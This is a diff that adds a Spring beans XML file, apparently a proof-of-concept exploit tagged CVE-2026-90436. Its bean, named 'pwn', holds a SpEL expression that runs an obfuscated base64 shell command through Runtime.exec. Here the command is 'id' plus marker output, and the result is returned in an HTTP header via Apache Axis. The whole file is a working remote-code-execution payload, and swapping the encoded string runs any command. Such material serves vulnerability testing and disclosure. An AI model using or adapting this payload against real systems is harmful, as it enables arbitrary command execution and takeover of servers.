@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pwn" class="java.lang.Object">
+    <property name="x" value="#{ T(org.apache.axis.MessageContext).getCurrentContext().getProperty('transport.http.servletResponse').setHeader('X-Cmd-Output', T(java.util.Base64).getEncoder().encodeToString(T(java.lang.Process).cast(T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c', new java.lang.String(T(java.util.Base64).getDecoder().decode('ZWNobyBDVkUtMjAyNi05MDQzNi1QT0MtYzBmZmVlNDI7IGlkOyBleHByIDMxNDEgKyA1OTI2'))})).getInputStream().readAllBytes())) }"/>
+  </bean>
+</beans>
